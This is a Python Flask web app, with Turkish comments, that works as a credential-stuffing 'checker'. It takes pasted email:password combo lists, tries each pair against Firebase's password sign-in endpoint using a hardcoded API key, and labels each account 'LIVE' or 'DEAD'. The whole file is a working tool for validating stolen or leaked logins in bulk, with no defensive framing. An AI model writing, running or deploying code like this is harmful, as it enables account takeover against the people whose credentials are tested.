import requests
import json
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# Firebase API Anahtarın (Burayı değiştirme, test anahtarıdır)
API_KEY = "AIzaSyApwFQ4Refm3F7jygYcBogi3r8W4dtXZDY"

def check_account(email, password):
    url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={API_KEY}"
    headers = {'Content-Type': 'application/json'}
    payload = {
        "email": email, 
        "password": password, 
        "returnSecureToken": True
    }
    
    try:
        r = requests.post(url, data=json.dumps(payload), headers=headers, timeout=10)
        data = r.json()
        
        if r.status_code == 200:
            return "LIVE ✅"
        
        error_msg = data.get('error', {}).get('message', 'DEAD')
        
        if error_msg in ["EMAIL_NOT_FOUND", "INVALID_PASSWORD"]:
            return "DEAD ❌"
        elif error_msg == "OPERATION_NOT_ALLOWED":
            return "HATA: Firebase Ayarı Kapalı!"
        else:
            return f"GOOGLE: {error_msg}"
            
    except Exception as e:
        return "BAGLANTI HATASI"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start_scan', methods=['POST'])
def start_scan():
    data = request.json
    combos = data.get('combos', '').splitlines()
    results = []
    
    for line in combos:
        if ":" in line:
            email, password = line.split(":", 1)
            status = check_account(email.strip(), password.strip())
            results.append({
                "account": f"{email.strip()}:{password.strip()}", 
                "status": status
            })
    
    return jsonify({"results": results})

# Vercel ve Yerel Çalıştırma İçin Şart Olan Kısım
if __name__ == '__main__':
    app.run(debug=True)
